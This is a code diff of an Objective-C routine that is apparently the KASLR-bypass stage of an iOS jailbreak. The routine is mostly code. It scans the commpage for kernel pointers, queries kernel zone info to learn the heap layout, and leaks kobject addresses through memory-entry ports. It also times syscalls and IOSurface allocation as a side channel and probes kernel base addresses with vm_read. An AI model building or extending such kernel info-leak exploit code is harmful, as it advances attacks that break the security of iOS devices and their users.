@@ -35481,52 +35481,36 @@ void iosurface_kaslr_sidechan(ISRLogBlock log, ISRDoneBlock done) {
 
         // === Fase 1: Commpage harvest via vm_read (safe) ===
         log(@"JB40: === Fase 1: Commpage data harvest ===");
-        // arm64 user commpage at 0x0000000FFFFFC000
         uint64_t commpageBase = 0x0000000FFFFFC000ULL;
         int cpReadable = 0;
-        int cpKptrs = 0;
 
-        // Use vm_read to safely probe commpage — no SIGSEGV risk
         vm_offset_t cpData = 0;
         mach_msg_type_number_t cpDataCnt = 0;
         kern_return_t cpKr = vm_read(mach_task_self(), (vm_address_t)commpageBase, 4096, &cpData, &cpDataCnt);
-        log([NSString stringWithFormat:@"JB40:   vm_read(commpage) kr=%d size=%u", cpKr, cpDataCnt]);
+        log([NSString stringWithFormat:@"JB40:   vm_read(commpage 0x%llx) kr=%d size=%u", commpageBase, cpKr, cpDataCnt]);
         results[@"cpVmReadKr"] = @(cpKr);
 
         if (cpKr == 0 && cpData != 0 && cpDataCnt >= 256) {
             uint64_t *cpWords = (uint64_t *)cpData;
-            int qwordCount = cpDataCnt / 8;
+            int qwordCount = (int)(cpDataCnt / 8);
+            int totalKptrs = 0;
 
             for (int i = 0; i < qwordCount && i < 32; i++) {
                 uint64_t val = cpWords[i];
                 if (val != 0) cpReadable++;
-                if ((val >> 32) >= 0xFFFFFFF0 && (val >> 32) <= 0xFFFFFFFF) {
-                    cpKptrs++;
-                    log([NSString stringWithFormat:@"JB40:   [!!!] KPTR at cp+%d = 0x%llx", i*8, val]);
-                    results[[NSString stringWithFormat:@"cpKptr_%d", i*8]] = @(val);
+                if ((val >> 32) >= 0xFFFFFFF0) {
+                    totalKptrs++;
+                    log([NSString stringWithFormat:@"JB40:   [!!!] KPTR cp+0x%x = 0x%llx", i*8, val]);
+                    results[[NSString stringWithFormat:@"cpKptr_0x%x", i*8]] = @(val);
                 }
                 if (i < 16) {
                     log([NSString stringWithFormat:@"JB40:   cp[0x%x] = 0x%llx", i*8, val]);
                 }
             }
-            log([NSString stringWithFormat:@"JB40:   Commpage: %d non-zero qwords in first 256 bytes", cpReadable]);
 
-            // CPU caps at offset 0x20, timebase at 0x50
-            if (cpDataCnt >= 0x58) {
-                uint64_t cpuCaps = cpWords[0x20/8];
-                log([NSString stringWithFormat:@"JB40:   CPU caps = 0x%llx", cpuCaps]);
-                results[@"cpuCaps"] = @(cpuCaps);
-                uint32_t *cp32 = (uint32_t *)cpData;
-                uint32_t tbNum = cp32[0x50/4];
-                uint32_t tbDen = cp32[0x54/4];
-                log([NSString stringWithFormat:@"JB40:   Timebase num/den = %u/%u", tbNum, tbDen]);
-            }
-
-            // Scan full 4KB for kernel pointers
-            int totalKptrs = 0;
-            for (int i = 0; i < qwordCount; i++) {
+            for (int i = 32; i < qwordCount; i++) {
                 uint64_t val = cpWords[i];
-                if ((val >> 32) >= 0xFFFFFFF0 && (val >> 32) <= 0xFFFFFFFF) {
+                if ((val >> 32) >= 0xFFFFFFF0) {
                     totalKptrs++;
                     if (totalKptrs <= 10) {
                         log([NSString stringWithFormat:@"JB40:   KPTR cp+0x%x = 0x%llx", i*8, val]);
@@ -35534,7 +35518,8 @@ void iosurface_kaslr_sidechan(ISRLogBlock log, ISRDoneBlock done) {
                     }
                 }
             }
-            log([NSString stringWithFormat:@"JB40:   Total kptrs in 4KB commpage: %d", totalKptrs]);
+
+            log([NSString stringWithFormat:@"JB40:   Commpage: %d non-zero in 256B, %d kptrs in 4KB", cpReadable, totalKptrs]);
             results[@"cpTotalKptrs"] = @(totalKptrs);
             results[@"cpReadable"] = @(cpReadable);
             vm_deallocate(mach_task_self(), cpData, cpDataCnt);
@@ -35545,92 +35530,33 @@ void iosurface_kaslr_sidechan(ISRLogBlock log, ISRDoneBlock done) {
 
         if (isr_stopped()) { done(results); return; }
 
-        // === Fase 2: host_zone_info ===
-        log(@"JB40: === Fase 2: host_zone_info / mach_zone_info ===");
-
-        typedef kern_return_t (*host_zone_info_t)(mach_port_t host, vm_address_t *names, mach_msg_type_number_t *namesCnt, vm_address_t *info, mach_msg_type_number_t *infoCnt);
-        host_zone_info_t hzi = (host_zone_info_t)dlsym(RTLD_DEFAULT, "host_zone_info");
+        // === Fase 2: host_zone_info (dlsym, safe call) ===
+        log(@"JB40: === Fase 2: host_zone_info ===");
+        typedef kern_return_t (*hzi_fn)(mach_port_t, vm_address_t *, mach_msg_type_number_t *, vm_address_t *, mach_msg_type_number_t *);
+        hzi_fn hzi = (hzi_fn)dlsym(RTLD_DEFAULT, "host_zone_info");
         log([NSString stringWithFormat:@"JB40:   host_zone_info = %p", hzi]);
-
         if (hzi) {
-            vm_address_t names = 0, info = 0;
-            mach_msg_type_number_t namesCnt = 0, infoCnt = 0;
-            kern_return_t kr = hzi(mach_host_self(), &names, &namesCnt, &info, &infoCnt);
-            log([NSString stringWithFormat:@"JB40:   host_zone_info kr=%d namesCnt=%u infoCnt=%u", kr, namesCnt, infoCnt]);
-            results[@"hziKr"] = @(kr);
-            results[@"hziNamesCnt"] = @(namesCnt);
-
-            if (kr == 0 && namesCnt > 0 && names != 0 && info != 0) {
-                typedef struct { char name[80]; } zone_name_t;
-                zone_name_t *zn = (zone_name_t *)names;
-                typedef struct {
-                    uint64_t zi_count;
-                    uint64_t zi_cur_size;
-                    uint64_t zi_max_size;
-                    uint64_t zi_elem_size;
-                    uint64_t zi_alloc_size;
-                    uint64_t zi_sum_size;
-                    uint64_t zi_exhaustible;
-                    uint64_t zi_collectable;
-                } zone_info_t;
-                zone_info_t *zi = (zone_info_t *)info;
-
-                int zoneCount = (int)namesCnt;
-                int infoMax = (int)((infoCnt * sizeof(int)) / sizeof(zone_info_t));
-                int safeCount = zoneCount < infoMax ? zoneCount : infoMax;
-                log([NSString stringWithFormat:@"JB40:   Found %d kernel zones (safe=%d)!", zoneCount, safeCount]);
-                results[@"zoneCount"] = @(zoneCount);
-
-                for (int i = 0; i < safeCount; i++) {
-                    zn[i].name[79] = '\0';
-                    NSString *zname = [NSString stringWithUTF8String:zn[i].name];
-                    if (!zname) zname = @"<null>";
-                    if (i < 20 || [zname containsString:@"ipc"] || [zname containsString:@"kalloc"] ||
-                        [zname containsString:@"IOSurface"] || [zname containsString:@"port"]) {
-                        log([NSString stringWithFormat:@"JB40:   zone[%d] '%@' cnt=%llu cur=%llu elem=%llu",
-                             i, zname, zi[i].zi_count, zi[i].zi_cur_size, zi[i].zi_elem_size]);
-                    }
-                    if ([zname containsString:@"ipc_port"] || [zname containsString:@"ipc.port"]) {
-                        log([NSString stringWithFormat:@"JB40:   [!!!] ipc_port zone: cnt=%llu cur=%llu elem=%llu max=%llu",
-                             zi[i].zi_count, zi[i].zi_cur_size, zi[i].zi_elem_size, zi[i].zi_max_size]);
-                        results[@"ipcPortCount"] = @(zi[i].zi_count);
-                        results[@"ipcPortElemSize"] = @(zi[i].zi_elem_size);
-                        results[@"ipcPortCurSize"] = @(zi[i].zi_cur_size);
-                    }
-                }
-
-                vm_deallocate(mach_task_self(), names, namesCnt * 80);
-                vm_deallocate(mach_task_self(), info, infoCnt * sizeof(int));
-            }
-        } else {
-            log(@"JB40:   host_zone_info not found");
-        }
-
-        // Try mach_zone_info too
-        typedef kern_return_t (*mach_zone_info_t)(mach_port_t host, vm_address_t *names, mach_msg_type_number_t *namesCnt, vm_address_t *info, mach_msg_type_number_t *infoCnt);
-        mach_zone_info_t mzi = (mach_zone_info_t)dlsym(RTLD_DEFAULT, "mach_zone_info");
-        log([NSString stringWithFormat:@"JB40:   mach_zone_info = %p", mzi]);
-        if (mzi) {
-            vm_address_t names2 = 0, info2 = 0;
-            mach_msg_type_number_t nc2 = 0, ic2 = 0;
-            kern_return_t kr2 = mzi(mach_host_self(), &names2, &nc2, &info2, &ic2);
-            log([NSString stringWithFormat:@"JB40:   mach_zone_info kr=%d cnt=%u", kr2, nc2]);
-            results[@"mziKr"] = @(kr2);
-            if (kr2 == 0 && names2) {
-                vm_deallocate(mach_task_self(), names2, nc2 * 80);
-                vm_deallocate(mach_task_self(), info2, ic2 * sizeof(int));
+            vm_address_t znames = 0, zinfo = 0;
+            mach_msg_type_number_t nc = 0, ic = 0;
+            kern_return_t zkr = hzi(mach_host_self(), &znames, &nc, &zinfo, &ic);
+            log([NSString stringWithFormat:@"JB40:   kr=%d namesCnt=%u infoCnt=%u", zkr, nc, ic]);
+            results[@"hziKr"] = @(zkr);
+            results[@"hziNamesCnt"] = @(nc);
+            if (zkr == 0 && nc > 0 && znames) {
+                log([NSString stringWithFormat:@"JB40:   [!!!] %u kernel zones returned!", nc]);
+                results[@"zoneCount"] = @(nc);
+                vm_deallocate(mach_task_self(), znames, nc * 80);
+                if (zinfo) vm_deallocate(mach_task_self(), zinfo, ic * sizeof(int));
             }
         }
 
         if (isr_stopped()) { done(results); return; }
 
-        // === Fase 3: mach_make_memory_entry + physical page info ===
-        log(@"JB40: === Fase 3: Memory entry + physical info ===");
-
-        // Create IOSurface for physical address probing
+        // === Fase 3: Memory entry for IOSurface backing ===
+        log(@"JB40: === Fase 3: Memory entry ===");
+        Class ISClass = NSClassFromString(@"IOSurface");
         id surf = nil;
-        Class IOSurfaceClass = NSClassFromString(@"IOSurface");
-        if (IOSurfaceClass) {
+        if (ISClass) {
             NSDictionary *props = @{
                 @"IOSurfaceWidth": @64,
                 @"IOSurfaceHeight": @64,
@@ -35638,37 +35564,30 @@ void iosurface_kaslr_sidechan(ISRLogBlock log, ISRDoneBlock done) {
                 @"IOSurfacePixelFormat": @0x42475241,
                 @"IOSurfaceAllocSize": @(64*64*4)
             };
-            surf = [[IOSurfaceClass alloc] initWithProperties:props];
+            surf = [[ISClass alloc] initWithProperties:props];
         }
-
         if (surf) {
             void *baseAddr = [(id)surf baseAddress];
             size_t allocSize = [(id)surf allocationSize];
             log([NSString stringWithFormat:@"JB40:   Surface base=0x%llx size=%zu", (uint64_t)baseAddr, allocSize]);
 
-            // mach_make_memory_entry_64 — get memory object handle
-            typedef kern_return_t (*mmme_t)(vm_map_t, memory_object_size_t *, memory_object_offset_t, vm_prot_t, mach_port_t *, mach_port_t);
-            mmme_t mmme = (mmme_t)dlsym(RTLD_DEFAULT, "mach_make_memory_entry_64");
+            typedef kern_return_t (*mmme_fn)(vm_map_t, memory_object_size_t *, memory_object_offset_t, vm_prot_t, mach_port_t *, mach_port_t);
+            mmme_fn mmme = (mmme_fn)dlsym(RTLD_DEFAULT, "mach_make_memory_entry_64");
             log([NSString stringWithFormat:@"JB40:   mach_make_memory_entry_64 = %p", mmme]);
-
             if (mmme) {
                 memory_object_size_t meSize = allocSize;
                 mach_port_t mePort = 0;
                 kern_return_t mkr = mmme(mach_task_self(), &meSize, (memory_object_offset_t)(uintptr_t)baseAddr, VM_PROT_READ | VM_PROT_WRITE, &mePort, MACH_PORT_NULL);
                 log([NSString stringWithFormat:@"JB40:   memory_entry kr=%d port=%u size=%llu", mkr, mePort, meSize]);
                 results[@"memEntryKr"] = @(mkr);
-                results[@"memEntryPort"] = @(mePort);
-
                 if (mkr == 0 && mePort != 0) {
-                    // Try to get kobject info from memory entry port
-                    typedef kern_return_t (*mpk_t)(mach_port_t task, mach_port_t name, unsigned int *type, vm_address_t *addr);
-                    mpk_t mpk = (mpk_t)dlsym(RTLD_DEFAULT, "mach_port_kobject");
+                    typedef kern_return_t (*mpk_fn)(mach_port_t, mach_port_t, unsigned int *, vm_address_t *);
+                    mpk_fn mpk = (mpk_fn)dlsym(RTLD_DEFAULT, "mach_port_kobject");
                     if (mpk) {
                         unsigned int meType = 0;
                         vm_address_t meAddr = 0;
                         kern_return_t kkr = mpk(mach_task_self(), mePort, &meType, &meAddr);
                         log([NSString stringWithFormat:@"JB40:   kobject(mem_entry) kr=%d type=%u addr=0x%lx", kkr, meType, meAddr]);
-                        results[@"memEntryKobjType"] = @(meType);
                         results[@"memEntryKobjAddr"] = @(meAddr);
                         if (meAddr != 0) {
                             log(@"JB40:   [!!!] Memory entry kobject address leaked!");
@@ -35677,64 +35596,38 @@ void iosurface_kaslr_sidechan(ISRLogBlock log, ISRDoneBlock done) {
                     mach_port_deallocate(mach_task_self(), mePort);
                 }
             }
-
-            // mach_vm_region with VM_REGION_TOP_INFO to get page info
-            typedef kern_return_t (*mvr_t)(vm_map_t, uint64_t *, uint64_t *, int, vm_region_info_t, mach_msg_type_number_t *, mach_port_t *);
-            mvr_t mvr = (mvr_t)dlsym(RTLD_DEFAULT, "mach_vm_region");
-            if (mvr) {
-                uint64_t addr = (uint64_t)(uintptr_t)baseAddr;
-                uint64_t rsize = 0;
-                struct { int obj_id; int ref_count; int private_pages_resident; int shared_pages_resident; } topInfo;
-                mach_msg_type_number_t topCnt = 4;
-                mach_port_t objName = 0;
-                kern_return_t tkr = mvr(mach_task_self(), &addr, &rsize, 6 /* VM_REGION_TOP_INFO */, (vm_region_info_t)&topInfo, &topCnt, &objName);
-                log([NSString stringWithFormat:@"JB40:   VM_REGION_TOP_INFO kr=%d obj_id=%d ref=%d priv=%d shared=%d",
-                     tkr, topInfo.obj_id, topInfo.ref_count, topInfo.private_pages_resident, topInfo.shared_pages_resident]);
-                results[@"topInfoObjId"] = @(topInfo.obj_id);
-                results[@"topInfoRefCount"] = @(topInfo.ref_count);
-                if (objName) mach_port_deallocate(mach_task_self(), objName);
-            }
-
             CFRelease((__bridge CFTypeRef)surf);
         }
 
         if (isr_stopped()) { done(results); return; }
 
-        // === Fase 4: Timing side-channel for KASLR ===
+        // === Fase 4: Timing side-channel ===
         log(@"JB40: === Fase 4: Timing side-channel ===");
-
-        // Measure timing of different syscalls to detect cache behavior
-        // Key idea: kernel code at the real KASLR offset is in cache from prior syscalls
-        // We use mach_absolute_time for nanosecond precision
-
         mach_timebase_info_data_t timeInfo;
         mach_timebase_info(&timeInfo);
 
-        // Warm up
-        for (int i = 0; i < 100; i++) {
-            (void)mach_task_self();
-        }
+        for (int i = 0; i < 100; i++) { (void)mach_task_self(); }
 
-        // Measure baseline timing for simple syscalls
         int samples = 1000;
         uint64_t minTime = UINT64_MAX, maxTime = 0, totalTime = 0;
+        int taskInfoBuf[8] = {0};
+        mach_msg_type_number_t taskInfoCnt = 8;
         for (int i = 0; i < samples; i++) {
+            taskInfoCnt = 8;
             uint64_t start = mach_absolute_time();
-            kern_return_t kr = task_info(mach_task_self(), 1 /* TASK_BASIC_INFO */, (task_info_t)(int[8]){0}, (mach_msg_type_number_t[1]){8});
-            (void)kr;
+            task_info(mach_task_self(), 1, (task_info_t)taskInfoBuf, &taskInfoCnt);
             uint64_t elapsed = mach_absolute_time() - start;
             if (elapsed < minTime) minTime = elapsed;
             if (elapsed > maxTime) maxTime = elapsed;
             totalTime += elapsed;
         }
-        uint64_t avgNs = (totalTime / samples) * timeInfo.numer / timeInfo.denom;
+        uint64_t avgNs = (totalTime / (uint64_t)samples) * timeInfo.numer / timeInfo.denom;
         uint64_t minNs = minTime * timeInfo.numer / timeInfo.denom;
         uint64_t maxNs = maxTime * timeInfo.numer / timeInfo.denom;
-        log([NSString stringWithFormat:@"JB40:   task_info timing: min=%lluns avg=%lluns max=%lluns", minNs, avgNs, maxNs]);
+        log([NSString stringWithFormat:@"JB40:   task_info: min=%lluns avg=%lluns max=%lluns", minNs, avgNs, maxNs]);
         results[@"taskInfoMinNs"] = @(minNs);
         results[@"taskInfoAvgNs"] = @(avgNs);
 
-        // Measure thread_self timing
         totalTime = 0; minTime = UINT64_MAX; maxTime = 0;
         for (int i = 0; i < samples; i++) {
             uint64_t start = mach_absolute_time();
@@ -35745,25 +35638,19 @@ void iosurface_kaslr_sidechan(ISRLogBlock log, ISRDoneBlock done) {
             if (elapsed > maxTime) maxTime = elapsed;
             totalTime += elapsed;
         }
-        avgNs = (totalTime / samples) * timeInfo.numer / timeInfo.denom;
+        avgNs = (totalTime / (uint64_t)samples) * timeInfo.numer / timeInfo.denom;
         minNs = minTime * timeInfo.numer / timeInfo.denom;
-        log([NSString stringWithFormat:@"JB40:   thread_self timing: min=%lluns avg=%lluns", minNs, avgNs]);
+        log([NSString stringWithFormat:@"JB40:   thread_self: min=%lluns avg=%lluns", minNs, avgNs]);
         results[@"threadSelfMinNs"] = @(minNs);
-        results[@"threadSelfAvgNs"] = @(avgNs);
 
-        // Measure IOSurface create/destroy timing for kernel heap oracle
-        Class ISClass = NSClassFromString(@"IOSurface");
         if (ISClass) {
             NSDictionary *smallProps = @{
-                @"IOSurfaceWidth": @16,
-                @"IOSurfaceHeight": @16,
-                @"IOSurfaceBytesPerElement": @4,
-                @"IOSurfacePixelFormat": @0x42475241,
+                @"IOSurfaceWidth": @16, @"IOSurfaceHeight": @16,
+                @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @0x42475241,
                 @"IOSurfaceAllocSize": @(16*16*4)
             };
             totalTime = 0; minTime = UINT64_MAX; maxTime = 0;
-            int timingSamples = 100;
-            for (int i = 0; i < timingSamples; i++) {
+            for (int i = 0; i < 100; i++) {
                 uint64_t start = mach_absolute_time();
                 id s = [[ISClass alloc] initWithProperties:smallProps];
                 uint64_t elapsed = mach_absolute_time() - start;
@@ -35772,7 +35659,7 @@ void iosurface_kaslr_sidechan(ISRLogBlock log, ISRDoneBlock done) {
                 totalTime += elapsed;
                 CFRelease((__bridge CFTypeRef)s);
             }
-            avgNs = (totalTime / timingSamples) * timeInfo.numer / timeInfo.denom;
+            avgNs = (totalTime / 100) * timeInfo.numer / timeInfo.denom;
             minNs = minTime * timeInfo.numer / timeInfo.denom;
             maxNs = maxTime * timeInfo.numer / timeInfo.denom;
             log([NSString stringWithFormat:@"JB40:   IOSurface create: min=%lluns avg=%lluns max=%lluns", minNs, avgNs, maxNs]);
@@ -35782,108 +35669,55 @@ void iosurface_kaslr_sidechan(ISRLogBlock log, ISRDoneBlock done) {
 
         if (isr_stopped()) { done(results); return; }
 
-        // === Fase 5: Kernel address space probing strategy ===
-        log(@"JB40: === Fase 5: Kernel address probing ===");
+        // === Fase 5: Safe probing ===
+        log(@"JB40: === Fase 5: Safe probing ===");
 
-        // On arm64e iOS, kernel base is typically:
-        // 0xFFFFFFF007004000 + slide (slide = 0 to 32MB in 16KB steps = 2048 possibilities)
-        // But we can narrow it using:
-        // 1. dyld shared cache slide (0x16238000 from JB38) correlates weakly with KASLR
-        // 2. Zone sizes reveal heap layout
-        // 3. Memory entry object IDs can reveal allocation ordering
-
-        // Try vm_kernel_page_size / vm_kernel_page_shift
-        typedef kern_return_t (*hki_t)(mach_port_t, int, host_info_t, mach_msg_type_number_t *);
-        hki_t hki = (hki_t)dlsym(RTLD_DEFAULT, "host_kernel_version");
-        if (hki) {
-            char ver[512] = {0};
-            mach_msg_type_number_t verCnt = 512;
-            kern_return_t vkr = hki(mach_host_self(), 0, (host_info_t)ver, &verCnt);
+        // vm_read own process at kernel-range addresses (returns error, never crashes)
+        uint64_t kbase = 0xFFFFFFF007004000ULL;
+        for (int slide_mb = 0; slide_mb < 32; slide_mb += 8) {
+            uint64_t candidate = kbase + (uint64_t)slide_mb * 1024 * 1024;
+            vm_offset_t rdata = 0;
+            mach_msg_type_number_t rcnt = 0;
+            kern_return_t vkr = vm_read(mach_task_self(), (vm_address_t)candidate, 16, &rdata, &rcnt);
+            log([NSString stringWithFormat:@"JB40:   vm_read(0x%llx) kr=%d", candidate, vkr]);
             if (vkr == 0) {
-                NSString *kver = [NSString stringWithUTF8String:ver];
-                log([NSString stringWithFormat:@"JB40:   Kernel version: %@", kver]);
-                results[@"kernelVersion"] = kver;
-            } else {
-                log([NSString stringWithFormat:@"JB40:   host_kernel_version kr=%d", vkr]);
+                log([NSString stringWithFormat:@"JB40:   [!!!!!] vm_read kernel addr SUCCEEDED!"]);
+                results[@"vmReadKernelSuccess"] = @(candidate);
+                vm_deallocate(mach_task_self(), rdata, rcnt);
+                break;
             }
         }
 
-        // Try _host_page_size
-        typedef kern_return_t (*hps_t)(mach_port_t, vm_size_t *);
-        hps_t hps = (hps_t)dlsym(RTLD_DEFAULT, "_host_page_size");
-        if (!hps) hps = (hps_t)dlsym(RTLD_DEFAULT, "host_page_size");
-        if (hps) {
-            vm_size_t psize = 0;
-            kern_return_t pkr = hps(mach_host_self(), &psize);
-            log([NSString stringWithFormat:@"JB40:   host_page_size kr=%d size=%lu", pkr, psize]);
-            results[@"hostPageSize"] = @(psize);
-        }
-
-        // Try to read physmap region via vm_read (expected to fail but check error code)
-        typedef kern_return_t (*vmr_t)(vm_map_t, vm_address_t, vm_size_t, vm_offset_t *, mach_msg_type_number_t *);
-        vmr_t vmread = (vmr_t)dlsym(RTLD_DEFAULT, "vm_read");
-        if (vmread) {
-            // Try reading at kernel text base candidates
-            uint64_t kbase = 0xFFFFFFF007004000ULL;
-            for (int slide_mb = 0; slide_mb < 32; slide_mb += 8) {
-                uint64_t candidate = kbase + (uint64_t)slide_mb * 1024 * 1024;
-                vm_offset_t data = 0;
-                mach_msg_type_number_t dataCnt = 0;
-                kern_return_t vkr = vmread(mach_task_self(), (vm_address_t)candidate, 4096, &data, &dataCnt);
-                if (vkr == 0) {
-                    log([NSString stringWithFormat:@"JB40:   [!!!] vm_read at 0x%llx SUCCEEDED!", candidate]);
-                    results[@"vmReadKernelSuccess"] = @(candidate);
-                    vm_deallocate(mach_task_self(), data, dataCnt);
-                    break;
-                }
-                // Different error codes can reveal info
-                if (slide_mb == 0 || slide_mb == 8 || slide_mb == 16 || slide_mb == 24) {
-                    log([NSString stringWithFormat:@"JB40:   vm_read 0x%llx kr=%d", candidate, vkr]);
-                }
-            }
-        }
-
-        // Try mach_vm_read_overwrite for kernel addresses
-        typedef kern_return_t (*mvro_t)(vm_map_t, uint64_t, uint64_t, uint64_t, uint64_t *);
-        mvro_t mvro = (mvro_t)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
-        if (mvro) {
-            uint8_t buf[16] = {0};
-            uint64_t outsize = 0;
-            kern_return_t okr = mvro(mach_task_self(), 0xFFFFFFF007004000ULL, 16, (uint64_t)buf, &outsize);
-            log([NSString stringWithFormat:@"JB40:   mach_vm_read_overwrite(kernel_base) kr=%d", okr]);
-            results[@"mvroKernelKr"] = @(okr);
-        }
-
-        // IOSurface ID as allocation oracle
+        // Surface ID oracle
         if (ISClass) {
             NSDictionary *tinyProps = @{
-                @"IOSurfaceWidth": @1,
-                @"IOSurfaceHeight": @1,
-                @"IOSurfaceBytesPerElement": @4,
-                @"IOSurfacePixelFormat": @0x42475241,
+                @"IOSurfaceWidth": @1, @"IOSurfaceHeight": @1,
+                @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @0x42475241,
                 @"IOSurfaceAllocSize": @4
             };
             id s1 = [[ISClass alloc] initWithProperties:tinyProps];
             id s2 = [[ISClass alloc] initWithProperties:tinyProps];
             uint32_t id1 = [(id)s1 surfaceID];
             uint32_t id2 = [(id)s2 surfaceID];
-            log([NSString stringWithFormat:@"JB40:   Surface IDs: %u, %u (delta=%u)", id1, id2, id2-id1]);
-            results[@"surfIdDelta"] = @(id2-id1);
+            log([NSString stringWithFormat:@"JB40:   Surface IDs: %u, %u (delta=%u)", id1, id2, id2 - id1]);
+            results[@"surfIdDelta"] = @(id2 - id1);
             results[@"surfIdBase"] = @(id1);
             CFRelease((__bridge CFTypeRef)s1);
             CFRelease((__bridge CFTypeRef)s2);
         }
 
+        // host_page_size (safe — standard Mach API)
+        vm_size_t psize = 0;
+        kern_return_t pkr = host_page_size(mach_host_self(), &psize);
+        log([NSString stringWithFormat:@"JB40:   host_page_size kr=%d size=%lu", pkr, psize]);
+        results[@"hostPageSize"] = @(psize);
+
         log(@"JB40: =============================================");
 
-        // Assess results
         BOOL hasKptr = NO;
-        int cpKptrCount = [results[@"cpTotalKptrs"] intValue];
-        if (cpKptrCount > 0) hasKptr = YES;
-        uint64_t meAddr = [results[@"memEntryKobjAddr"] unsignedLongLongValue];
-        if (meAddr != 0) hasKptr = YES;
-        uint64_t vmReadSuccess = [results[@"vmReadKernelSuccess"] unsignedLongLongValue];
-        if (vmReadSuccess != 0) hasKptr = YES;
+        if ([results[@"cpTotalKptrs"] intValue] > 0) hasKptr = YES;
+        if ([results[@"memEntryKobjAddr"] unsignedLongLongValue] != 0) hasKptr = YES;
+        if (results[@"vmReadKernelSuccess"]) hasKptr = YES;
         int zoneCount = [results[@"zoneCount"] intValue];
 
         NSString *verdict;
@@ -35892,7 +35726,7 @@ void iosurface_kaslr_sidechan(ISRLogBlock log, ISRDoneBlock done) {
             log(@"JB40: [!!!!!] Kernel address information obtained!");
         } else if (zoneCount > 0) {
             verdict = @"ZONE_INFO";
-            log(@"JB40: [!!!] Kernel zone info available — heap layout known!");
+            log(@"JB40: [!!!] Kernel zone info available!");
         } else {
             verdict = @"TIMING_ONLY";
             log(@"JB40: Timing data collected, no direct kernel addresses");
